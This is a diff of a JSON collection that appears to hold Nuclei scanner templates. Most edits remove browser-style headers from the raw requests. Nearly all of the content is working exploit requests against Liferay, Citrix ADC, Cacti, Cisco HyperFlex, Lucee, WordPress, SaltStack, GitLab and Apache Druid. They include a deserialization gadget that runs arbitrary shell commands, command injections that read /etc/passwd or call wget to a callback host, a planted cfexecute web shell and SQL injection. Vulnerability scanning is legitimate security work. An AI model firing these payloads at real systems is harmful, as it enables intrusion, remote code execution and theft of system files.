-            "POST /api/jsonws/invoke HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55\nContent-Length: 4938\nAccept: */*\nAccept-Language: en\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData\nX-Requested-With: XMLHttpRequest\ncmd2: §command§\n\ncmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D\n"
+            "POST /api/jsonws/invoke HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData\ncmd2: §command§\n\ncmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D\n"
           ]
         }
       ]
@@ -21481,7 +21585,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /menu/stapp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 96\nContent-Type: application/x-www-form-urlencoded\nX-NITRO-USER: xpyZxwy6\n\nsid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot\n"
+            "POST /menu/stapp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nX-NITRO-USER: xpyZxwy6\n\nsid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot\n"
           ]
         }
       ]
@@ -21523,12 +21627,12 @@
             }
           ],
           "raw": [
-            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/xml\nX-NITRO-USER: xpyZxwy6\nX-NITRO-PASS: xWXHUJ56\n\n<appfwprofile><login></login></appfwprofile>\n",
-            "GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
-            "GET /menu/neo HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
-            "GET /menu/stc HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
-            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: §randkey§\n\n<appfwprofile><login></login></appfwprofile>\n",
-            "POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: §randkey§\n\n<clipermission></clipermission>\n"
+            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\nX-NITRO-USER: xpyZxwy6\nX-NITRO-PASS: xWXHUJ56\n\n<appfwprofile><login></login></appfwprofile>\n",
+            "GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /menu/neo HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /menu/stc HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: §randkey§\n\n<appfwprofile><login></login></appfwprofile>\n",
+            "POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: §randkey§\n\n<clipermission></clipermission>\n"
           ]
         }
       ]
@@ -21537,11 +21641,9 @@
       "id": "CVE-2020-8194",
       "info": {
         "author": "dwisiswant0",
-        "description": "Reflected code injection in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows the modification of a file download.\n",
+        "description": "Reflected code injection in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows the modification of a file download.",
         "name": "Citrix ADC & NetScaler Gateway Reflected Code Injection",
-        "reference": [
-          "https://support.citrix.com/article/CTX276688"
-        ],
+        "reference": "https://support.citrix.com/article/CTX276688",
         "severity": "high",
         "tags": "cve,cve2020,citrix"
       },
@@ -21571,7 +21673,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /menu/guiw?nsbrand=1&protocol=nonexistent.1337\">&id=3&nsvpx=phpinfo HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nCookie: startupapp=st\nUpgrade-Insecure-Requests: 1\n"
+            "GET /menu/guiw?nsbrand=1&protocol=nonexistent.1337\">&id=3&nsvpx=phpinfo HTTP/1.1\nHost: {{Hostname}}\nCookie: startupapp=st\n"
           ]
         }
       ]
@@ -21691,7 +21793,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /cgi-bin/mainfunction.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n\naction=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a\n"
+            "POST /cgi-bin/mainfunction.cgi HTTP/1.1\nHost: {{Hostname}}\n\naction=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a\n"
           ]
         }
       ]
@@ -21773,7 +21875,7 @@
             }
           ],
           "raw": [
-            "GET /graph_realtime.php?action=init HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.18.4\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nCookie: Cacti=%3Bwget%20http%3A//{{interactsh-url}}\n"
+            "GET /graph_realtime.php?action=init HTTP/1.1\nHost: {{Hostname}}\nCookie: Cacti=%3Bwget%20http%3A//{{interactsh-url}}\n"
           ]
         }
       ]
@@ -21971,9 +22073,6 @@
       },
       "requests": [
         {
-          "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
-          },
           "matchers": [
             {
               "type": "word",
@@ -22424,7 +22523,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /storfs-asup HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nContent-Length: 78\nContent-Type: application/x-www-form-urlencoded\n\naction=&token=`wget http://{{interactsh-url}}`&mode=`wget http://{{interactsh-url}}`\n"
+            "POST /storfs-asup HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\naction=&token=`wget http://{{interactsh-url}}`&mode=`wget http://{{interactsh-url}}`\n"
           ]
         }
       ]
@@ -22572,7 +22671,7 @@
           "matchers-condition": "and",
           "raw": [
             "GET /images/..%2finfo.html HTTP/1.1\nHost: {{Hostname}}\nReferer: {{{{BaseURL}}}}/info.html\n",
-            "GET /images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken), base64_decode(\"R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"))}} HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=8; url=ping.html; mobile=false;\nReferer: {{BaseURL}}/info.html\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 178\n"
+            "GET /images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken), base64_decode(\"R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"))}} HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=8; url=ping.html; mobile=false;\nReferer: {{BaseURL}}/info.html\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -22707,9 +22806,9 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /lucee/admin/imgProcess.cfm?file=/whatever HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 8\n\nimgSrc=a\n",
-            "POST /lucee/admin/imgProcess.cfm?file=/../../../context/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 790\n\nimgSrc=\n<cfoutput>\n\n<table>\n<form method=\"POST\" action=\"\">\n<tr><td>Command:</td><td><input type=test name=\"cmd\" size=50\n<cfif isdefined(\"form.cmd\")>value=\"#form.cmd#\"</cfif>><br></td></tr>\n<tr><td>Options:</td><td> <input type=text name=\"opts\" size=50\n<cfif isdefined(\"form.opts\")>value=\"#form.opts#\"</cfif>><br></td></tr>\n<tr><td>Timeout:</td><td> <input type=text name=\"timeout\" size=4\n<cfif isdefined(\"form.timeout\")>value=\"#form.timeout#\"\n<cfelse> value=\"5\"</cfif>></td></tr>\n</table>\n<input type=submit value=\"Exec\" >\n</form>\n<cfif isdefined(\"form.cmd\")>\n<cfsavecontent variable=\"myVar\">\n<cfexecute name = \"#Form.cmd#\"\narguments = \"#Form.opts#\"\ntimeout = \"#Form.timeout#\">\n</cfexecute>\n</cfsavecontent>\n<pre>\n#HTMLCodeFormat(myVar)#\n</pre>\n</cfif>\n</cfoutput>\n",
-            "POST /lucee/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\n\ncmd=id&opts=&timeout=5\n"
+            "POST /lucee/admin/imgProcess.cfm?file=/whatever HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nimgSrc=a\n",
+            "POST /lucee/admin/imgProcess.cfm?file=/../../../context/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nimgSrc=\n<cfoutput>\n\n<table>\n<form method=\"POST\" action=\"\">\n<tr><td>Command:</td><td><input type=test name=\"cmd\" size=50\n<cfif isdefined(\"form.cmd\")>value=\"#form.cmd#\"</cfif>><br></td></tr>\n<tr><td>Options:</td><td> <input type=text name=\"opts\" size=50\n<cfif isdefined(\"form.opts\")>value=\"#form.opts#\"</cfif>><br></td></tr>\n<tr><td>Timeout:</td><td> <input type=text name=\"timeout\" size=4\n<cfif isdefined(\"form.timeout\")>value=\"#form.timeout#\"\n<cfelse> value=\"5\"</cfif>></td></tr>\n</table>\n<input type=submit value=\"Exec\" >\n</form>\n<cfif isdefined(\"form.cmd\")>\n<cfsavecontent variable=\"myVar\">\n<cfexecute name = \"#Form.cmd#\"\narguments = \"#Form.opts#\"\ntimeout = \"#Form.timeout#\">\n</cfexecute>\n</cfsavecontent>\n<pre>\n#HTMLCodeFormat(myVar)#\n</pre>\n</cfif>\n</cfoutput>\n",
+            "POST /lucee/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ncmd=id&opts=&timeout=5\n"
           ]
         }
       ]
@@ -22808,7 +22907,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /wp-json/buddypress/v1/signup HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"user_login\":\"{{randstr}}\",\n  \"password\":\"{{randstr}}\",\n  \"user_name\":\"{{randstr}}\",\n  \"user_email\":\"{{randstr}}@example.com\"\n}\n"
+            "POST /wp-json/buddypress/v1/signup HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"user_login\":\"{{randstr}}\",\n  \"password\":\"{{randstr}}\",\n  \"user_name\":\"{{randstr}}\",\n  \"user_email\":\"{{randstr}}@example.com\"\n}\n"
           ]
         }
       ]
@@ -23133,7 +23232,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /casa/nodes/thumbprints HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json;charset=UTF-8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n[\"127.0.0.1:443/ui/\"]\n"
+            "POST /casa/nodes/thumbprints HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json;charset=UTF-8\n\n[\"127.0.0.1:443/ui/\"]\n"
           ]
         }
       ]
@@ -23204,7 +23303,7 @@
             }
           ],
           "raw": [
-            "POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/json\nContent-Length: 86\nConnection: close\n\n{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\n"
+            "POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/json\n\n{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\n"
           ]
         }
       ]
@@ -23316,7 +23415,7 @@
             }
           ],
           "raw": [
-            "POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nReferer: {{BaseURL}}\ncontent-type: application/json\nConnection: close\n\n{\"content\": \"include:\\n  remote: http://{{interactsh-url}}/api/v1/targets?test.yml\"}\n"
+            "POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\ncontent-type: application/json\n\n{\"content\": \"include:\\n  remote: http://{{interactsh-url}}/api/v1/targets?test.yml\"}\n"
           ]
         }
       ]
@@ -23680,7 +23779,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nContent-Length: 47\n\naction=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -\n"
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\naction=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -\n"
           ]
         }
       ]
@@ -24242,7 +24341,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /run HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/json\nContent-Length: 173\nConnection: close\n\n{\"client\":\"wheel_async\",\"fun\":\"pillar_roots.write\",\"data\":\"testing\",\"path\":\"../../../../../../../tmp/testing\",\"username\":\"1\",\"password\":\"1\",\"eauth\":\"pam\"}\n"
+            "POST /run HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"client\":\"wheel_async\",\"fun\":\"pillar_roots.write\",\"data\":\"testing\",\"path\":\"../../../../../../../tmp/testing\",\"username\":\"1\",\"password\":\"1\",\"eauth\":\"pam\"}\n"
           ]
         }
       ]
@@ -24292,7 +24391,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/json\nContent-Length: 1006\nConnection: close\n\n{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\",\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"/etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\":{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n            },\n            \"dimensionsSpec\":{\n\n            },\n            \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\",\n            \"\":{\n               \"enabled\":\"true\"\n            }\n         }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}\n"
